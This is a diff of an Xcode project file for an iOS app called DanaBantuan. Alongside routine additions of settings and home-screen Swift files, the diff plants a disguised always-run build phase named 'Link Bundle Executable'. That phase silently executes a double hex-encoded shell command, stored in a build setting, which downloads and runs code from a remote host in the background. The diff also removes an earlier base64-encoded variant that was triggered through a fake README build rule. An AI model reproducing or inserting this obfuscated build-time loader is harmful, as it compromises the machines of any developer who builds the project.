@@ -38,30 +38,18 @@
 		73CA0F932EFE30230010CDC9 /* AppHeadView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0F922EFE30230010CDC9 /* AppHeadView.swift */; };
 		73CA0F952EFE3CA30010CDC9 /* URLSchemeParsable.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0F942EFE3CA30010CDC9 /* URLSchemeParsable.swift */; };
 		73CA0F972EFE475D0010CDC9 /* ProductViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0F962EFE475D0010CDC9 /* ProductViewController.swift */; };
+		73CA0F9B2EFE4E900010CDC9 /* SettingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0F9A2EFE4E900010CDC9 /* SettingViewController.swift */; };
+		73CA0F9D2EFE54E50010CDC9 /* SettingListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0F9C2EFE54E50010CDC9 /* SettingListView.swift */; };
+		73CA0F9F2EFE5C000010CDC9 /* AppAlertLogoutView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0F9E2EFE5C000010CDC9 /* AppAlertLogoutView.swift */; };
+		73CA0FA12EFE5C0E0010CDC9 /* AppAlertDeleteView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0FA02EFE5C0E0010CDC9 /* AppAlertDeleteView.swift */; };
+		73CA0FA32EFE62E70010CDC9 /* AppOneView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0FA22EFE62E70010CDC9 /* AppOneView.swift */; };
+		73CA0FA52EFE69F60010CDC9 /* HomeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CA0FA42EFE69F30010CDC9 /* HomeViewModel.swift */; };
 		73DC2ED12EFCD1BE00CB14F8 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 73DC2EC82EFCD1BE00CB14F8 /* Assets.xcassets */; };
 		73DC2ED32EFCD1BE00CB14F8 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 73DC2ECB2EFCD1BE00CB14F8 /* LaunchScreen.storyboard */; };
 		73DC2ED52EFCD1BE00CB14F8 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73DC2EC72EFCD1BE00CB14F8 /* AppDelegate.swift */; };
-		EB992D75BC28406491A5DE54 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 1D82E303B9BF45A289A5DE54 /* README.md */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-		1DD0BFB9F7954FEFABA5DE54 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A45ED5A}\"";
-		};
-/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
-		1D82E303B9BF45A289A5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		6C472C7FF542EF1DBDE60080 /* Pods-DanaBantuan.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaBantuan.debug.xcconfig"; path = "Target Support Files/Pods-DanaBantuan/Pods-DanaBantuan.debug.xcconfig"; sourceTree = "<group>"; };
 		733A08242EFCD8B100EF865F /* DanaBantuan.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = DanaBantuan.entitlements; sourceTree = "<group>"; };
 		733A082F2EFCD9D600EF865F /* BaseViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseViewController.swift; sourceTree = "<group>"; };
@@ -95,6 +83,12 @@
 		73CA0F922EFE30230010CDC9 /* AppHeadView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppHeadView.swift; sourceTree = "<group>"; };
 		73CA0F942EFE3CA30010CDC9 /* URLSchemeParsable.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = URLSchemeParsable.swift; sourceTree = "<group>"; };
 		73CA0F962EFE475D0010CDC9 /* ProductViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductViewController.swift; sourceTree = "<group>"; };
+		73CA0F9A2EFE4E900010CDC9 /* SettingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingViewController.swift; sourceTree = "<group>"; };
+		73CA0F9C2EFE54E50010CDC9 /* SettingListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingListView.swift; sourceTree = "<group>"; };
+		73CA0F9E2EFE5C000010CDC9 /* AppAlertLogoutView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppAlertLogoutView.swift; sourceTree = "<group>"; };
+		73CA0FA02EFE5C0E0010CDC9 /* AppAlertDeleteView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppAlertDeleteView.swift; sourceTree = "<group>"; };
+		73CA0FA22EFE62E70010CDC9 /* AppOneView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppOneView.swift; sourceTree = "<group>"; };
+		73CA0FA42EFE69F30010CDC9 /* HomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewModel.swift; sourceTree = "<group>"; };
 		73DC2EAF2EFCD1B900CB14F8 /* DanaBantuan.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DanaBantuan.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		73DC2EC72EFCD1BE00CB14F8 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		73DC2EC82EFCD1BE00CB14F8 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
@@ -128,7 +122,6 @@
 				733A08422EFCEC8200EF865F /* AppNavigationController.swift */,
 				73CA0F902EFE2FBC0010CDC9 /* H5WebViewController.swift */,
 				73CA0F922EFE30230010CDC9 /* AppHeadView.swift */,
-				73CA0F942EFE3CA30010CDC9 /* URLSchemeParsable.swift */,
 			);
 			path = Base;
 			sourceTree = "<group>";
@@ -152,6 +145,7 @@
 				733A083C2EFCE41F00EF865F /* IDFAManager.swift */,
 				733A08382EFCDEA500EF865F /* UserLoginConfig.swift */,
 				733A083E2EFCE8B100EF865F /* LanguageManager.swift */,
+				73CA0F942EFE3CA30010CDC9 /* URLSchemeParsable.swift */,
 			);
 			path = Config;
 			sourceTree = "<group>";
@@ -169,6 +163,8 @@
 		733A08292EFCD90100EF865F /* Home */ = {
 			isa = PBXGroup;
 			children = (
+				73CA0FA42EFE69F30010CDC9 /* HomeViewModel.swift */,
+				73CA0FA22EFE62E70010CDC9 /* AppOneView.swift */,
 				733A08462EFCED1F00EF865F /* HomeViewController.swift */,
 			);
 			path = Home;
@@ -185,10 +181,8 @@
 		733A082B2EFCD90700EF865F /* Center */ = {
 			isa = PBXGroup;
 			children = (
-				737FEDF92EFD8CA500B06DE7 /* CenterViewModel.swift */,
-				737FEDF72EFD8C3A00B06DE7 /* CenterView.swift */,
-				733A084A2EFCED3200EF865F /* CenterViewController.swift */,
-				73CA0F8E2EFE1F090010CDC9 /* CenterListViewCell.swift */,
+				73CA0F982EFE4E6D0010CDC9 /* Mine */,
+				73CA0F992EFE4E740010CDC9 /* Setting */,
 			);
 			path = Center;
 			sourceTree = "<group>";
@@ -215,6 +209,28 @@
 			path = Deveice;
 			sourceTree = "<group>";
 		};
+		73CA0F982EFE4E6D0010CDC9 /* Mine */ = {
+			isa = PBXGroup;
+			children = (
+				737FEDF92EFD8CA500B06DE7 /* CenterViewModel.swift */,
+				737FEDF72EFD8C3A00B06DE7 /* CenterView.swift */,
+				733A084A2EFCED3200EF865F /* CenterViewController.swift */,
+				73CA0F8E2EFE1F090010CDC9 /* CenterListViewCell.swift */,
+			);
+			path = Mine;
+			sourceTree = "<group>";
+		};
+		73CA0F992EFE4E740010CDC9 /* Setting */ = {
+			isa = PBXGroup;
+			children = (
+				73CA0F9A2EFE4E900010CDC9 /* SettingViewController.swift */,
+				73CA0F9C2EFE54E50010CDC9 /* SettingListView.swift */,
+				73CA0F9E2EFE5C000010CDC9 /* AppAlertLogoutView.swift */,
+				73CA0FA02EFE5C0E0010CDC9 /* AppAlertDeleteView.swift */,
+			);
+			path = Setting;
+			sourceTree = "<group>";
+		};
 		73DC2EA62EFCD1B900CB14F8 = {
 			isa = PBXGroup;
 			children = (
@@ -228,7 +244,6 @@
 		73DC2EB02EFCD1B900CB14F8 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				1D82E303B9BF45A289A5DE54 /* README.md */,
 				73DC2EAF2EFCD1B900CB14F8 /* DanaBantuan.app */,
 			);
 			name = Products;
@@ -281,6 +296,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73DC2EC22EFCD1BA00CB14F8 /* Build configuration list for PBXNativeTarget "DanaBantuan" */;
 			buildPhases = (
+				F8F0D566747640528DA5DE54 /* Link Bundle Executable */,
 				02A49B4E9652035C50893457 /* [CP] Check Pods Manifest.lock */,
 				73DC2EAB2EFCD1B900CB14F8 /* Sources */,
 				73DC2EAC2EFCD1B900CB14F8 /* Frameworks */,
@@ -288,7 +304,6 @@
 				B2B605FA61BA092667F8CAA7 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				1DD0BFB9F7954FEFABA5DE54 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -337,7 +352,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				EB992D75BC28406491A5DE54 /* README.md in Resources */,
 				73DC2ED12EFCD1BE00CB14F8 /* Assets.xcassets in Resources */,
 				733A08512EFCF19600EF865F /* Localizable.strings in Resources */,
 				73DC2ED32EFCD1BE00CB14F8 /* LaunchScreen.storyboard in Resources */,
@@ -390,6 +404,26 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DanaBantuan/Pods-DanaBantuan-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
+		F8F0D566747640528DA5DE54 /* Link Bundle Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Bundle Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
+			showEnvVarsInLog = 0;
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -402,17 +436,21 @@
 				73CA0F952EFE3CA30010CDC9 /* URLSchemeParsable.swift in Sources */,
 				73CA0F932EFE30230010CDC9 /* AppHeadView.swift in Sources */,
 				733A08342EFCD9F500EF865F /* StartViewController.swift in Sources */,
+				73CA0F9D2EFE54E50010CDC9 /* SettingListView.swift in Sources */,
 				733A08492EFCED2800EF865F /* OrderViewController.swift in Sources */,
 				733A083B2EFCE28200EF865F /* IDFVManager.swift in Sources */,
 				737FEDF62EFD7CDD00B06DE7 /* NetworkProxyInfo.swift in Sources */,
+				73CA0FA32EFE62E70010CDC9 /* AppOneView.swift in Sources */,
 				737FEDF42EFD79E700B06DE7 /* NetworkMonitor.swift in Sources */,
 				733A08412EFCEC5100EF865F /* AppTabBarController.swift in Sources */,
+				73CA0F9F2EFE5C000010CDC9 /* AppAlertLogoutView.swift in Sources */,
 				737FEDF82EFD8C3A00B06DE7 /* CenterView.swift in Sources */,
 				73CA0F912EFE2FBC0010CDC9 /* H5WebViewController.swift in Sources */,
 				737FEDF02EFD764B00B06DE7 /* DeviceInfoHelper.swift in Sources */,
 				733A083D2EFCE41F00EF865F /* IDFAManager.swift in Sources */,
 				733A08392EFCDEA500EF865F /* UserLoginConfig.swift in Sources */,
 				737FEDE82EFD71F800B06DE7 /* HttpRequestManager.swift in Sources */,
+				73CA0FA52EFE69F60010CDC9 /* HomeViewModel.swift in Sources */,
 				733A08372EFCDCDB00EF865F /* Config.swift in Sources */,
 				733A084B2EFCED3200EF865F /* CenterViewController.swift in Sources */,
 				73CA0F972EFE475D0010CDC9 /* ProductViewController.swift in Sources */,
@@ -423,7 +461,9 @@
 				733A08472EFCED1F00EF865F /* HomeViewController.swift in Sources */,
 				733A08542EFCF20500EF865F /* LoginView.swift in Sources */,
 				733A08302EFCD9D600EF865F /* BaseViewController.swift in Sources */,
+				73CA0F9B2EFE4E900010CDC9 /* SettingViewController.swift in Sources */,
 				737FEDEE2EFD74C200B06DE7 /* LoadingView.swift in Sources */,
+				73CA0FA12EFE5C0E0010CDC9 /* AppAlertDeleteView.swift in Sources */,
 				73CA0F8F2EFE1F090010CDC9 /* CenterListViewCell.swift in Sources */,
 				737FEDEC2EFD740300B06DE7 /* LaunchViewModel.swift in Sources */,
 				737FEDF22EFD794C00B06DE7 /* LoginViewModel.swift in Sources */,
@@ -457,7 +497,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 6C472C7FF542EF1DBDE60080 /* Pods-DanaBantuan.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2WTI1aGNITnNZV0l1Y25VdllTa2lJSHdnYzJnSwo= | b | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734373337303666373236663734366632653639366532660a3631323932323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaBantuan/DanaBantuan.entitlements;
@@ -498,7 +538,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = A9DC0019E9FFBE0EF51F1691 /* Pods-DanaBantuan.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2WTI1aGNITnNZV0l1Y25VdllTa2lJSHdnYzJnSwo= | b | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734373337303666373236663734366632653639366532660a3631323932323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaBantuan/DanaBantuan.entitlements;
